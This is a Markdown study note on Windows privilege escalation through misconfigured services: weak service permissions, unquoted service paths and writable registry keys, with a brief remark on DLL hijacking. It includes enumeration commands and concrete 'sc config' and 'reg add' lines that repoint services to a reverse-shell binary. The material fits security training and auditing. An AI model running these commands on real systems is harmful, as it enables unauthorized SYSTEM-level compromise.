
# Windows Privilege Escalation: Misconfigured Services

- **Core Concept:** Exploiting architectural misconfigurations within Windows Services (Insecure Permissions, Path Flaws, and Registry Weaknesses) to execute arbitrary binaries under high-privilege context like `NT AUTHORITY\SYSTEM`.

---

## Windows Services vs. Scheduled Tasks

Understanding the behavioral baseline under First Principles:

*   **Windows Service:** A background process execution mechanism that runs autonomously without user interaction (e.g., Antivirus daemons). Crucially, the operating system can interact with it—monitoring logs, tracking exceptions, handling inputs/outputs, and auto-restarting the process upon failure.
*   **Scheduled Task:** An automated task triggered by precise parameters (e.g., timed loops or login states). Unlike services, the OS cannot actively manage runtime crashes or dynamically bind process lifecycle hooks inside it.

---

##  Attack Vectors: Technical Breakdown

                [ WINDOWS SERVICE AUDITING ]
                             │
     ┌───────────────────────┼───────────────────────┐
     ▼                       ▼                       ▼
```

┌──────────────────┐ ┌───────────────────┐ ┌────────────────────┐ │ Weak Permissions │ │ Unquoted Paths │ │ Registry Weakness │ │ (SERVICE_CHANGE_ │ │ (Space Ingestion │ │ (Insecure Service │ │(CONFIG) │ │(Execution) │ │(Hives)│ └────────┬─────────┘ └─────────┬─────────┘ └─────────┬──────────┘ │ │ │ └───────────────────────┼───────────────────────┘ ▼ [ Replace/Modify Binary ] │ ▼ [ Restart Service ] │ ▼ [ NT AUTHORITY\SYSTEM CAPTURED ]

````

---

## 1. Weak Service Permissions (Insecure Reconfiguration)

If a low-privilege user possesses modification rights over a service's structural properties, they can reconfigure the execution parameter to point to a malicious binary rather than the original program.

### Enumeration via Accesschk (Sysinternals)
Check for explicit control strings such as `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`:
```cmd
accesschk.exe -uwcqv Users *
accesschk.exe -uwcqv "Authenticated Users" *
````

### Exploit Execution Flow

1. **Query Service Context:**
    
```
   sc qc <Vulnerable_Service_Name>
```

2. **Reconfigure Binary Path (`binpath`):** Inject a reverse shell launcher or a command sequence:
    
```
   sc config <Vulnerable_Service_Name> binpath= "C:\PrivEsc\reverse_shell.exe"
```

_(Note: The space right after `binpath=` is syntactically mandatory in Windows OS)._ 3. **Trigger Execution:** Restart the service to force initialization of the newly mapped binary:

```
   sc stop <Vulnerable_Service_Name>
   sc start <Vulnerable_Service_Name>
```

## 2. Unquoted Service Paths

This flaw occurs when a service's binary executable path contains spaces and is **not enclosed within quotation marks** (e.g., `C:\Program Files\Development Tools\Service.exe`).

### The Exploitation Mechanism (Windows Ambiguity resolution)

When the Service Control Manager reads an unquoted execution string containing spaces, it intercepts spaces as delimiters and attempts to append `.exe` sequentially to execute the earliest match:

1. `C:\Program.exe` (If you have write access here, hijack succeeds)
    
2. `C:\Program Files\Development.exe` (Next check)
    
3. `C:\Program Files\Development Tools\Service.exe` (Actual legitimate path)
    

### Automated Discovery (CMD)

```
wmic service get name,displayname,pathname,startmode | findstr /i "LocalSystem" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

### Attack Step

If you possess write access to `C:\Program Files\`, simply name your malicious reverse shell payload as `Development.exe` and drop it into that directory, then restart the target service.

## 3. Insecure Registry Permissions

Windows maps every individual service properties inside specific registry paths. If the binary file system itself is secured, but the Registry keys mapping them are globally writable, an attacker can modify the startup configuration directly inside the registry database.

### Core Hive Target

```
HKLM\SYSTEM\CurrentControlSet\Services\<Service_Name>
```

### Query Key Status

```
accesschk.exe -uvw "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services
```

### Modification Phase

If write permissions exist over the keys, update the `ImagePath` data parameter directly using the registry tool:

```
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<Service_Name>" /v ImagePath /t REG_EXPAND_SZ /d "C:\PrivEsc\shell.exe" /f
```

## ⚠️ A Note on DLL Hijacking Realities

While DLL (Dynamic Link Library) Hijacking is a recognized privilege escalation vector (placing a malicious DLL inside a directory where a high-privilege application searches for missing dependencies), it presents distinct challenges in modern real-world environments:

- **Administrative Prerequisite:** Tools or OS checks that reveal missing system paths or system runtime crashes typically require administrative permissions to audit or trace accurately.
    
- **The Paradox:** Needing administrative rights to uncover a pathway to gain administrative rights defeats the practical timeline of standalone privilege escalation loops.
    
- **Alternative:** True execution without admin visibility relies heavily on complex binary reverse engineering to manually track search order configurations within codeblocks.

---
